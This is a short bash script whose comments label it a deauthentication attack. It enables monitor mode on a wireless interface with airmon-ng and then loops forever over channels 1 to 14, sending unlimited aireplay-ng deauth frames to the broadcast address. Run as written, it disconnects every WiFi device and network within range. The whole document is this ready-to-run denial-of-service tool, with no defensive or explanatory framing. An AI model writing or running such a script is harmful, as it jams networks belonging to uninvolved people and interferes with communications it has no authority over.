#!/bin/bash

# Define the WiFi interface
INTERFACE="wlan0"

# Kill conflicting processes
echo "[+] Stopping conflicting processes..."
sudo airmon-ng check kill

# Start monitor mode
echo "[+] Enabling monitor mode on $INTERFACE..."
sudo airmon-ng start $INTERFACE

# Set monitor mode interface name
MONITOR_INTERFACE="${INTERFACE}mon"

# Deauth Attack on all channels and all devices
echo "[+] Launching Deauth Attack on all devices on all channels..."
while true; do
    for CH in {1..14}; do
        sudo iwconfig $MONITOR_INTERFACE channel $CH
        sudo aireplay-ng --deauth 0 -a FF:FF:FF:FF:FF:FF $MONITOR_INTERFACE
    done
done
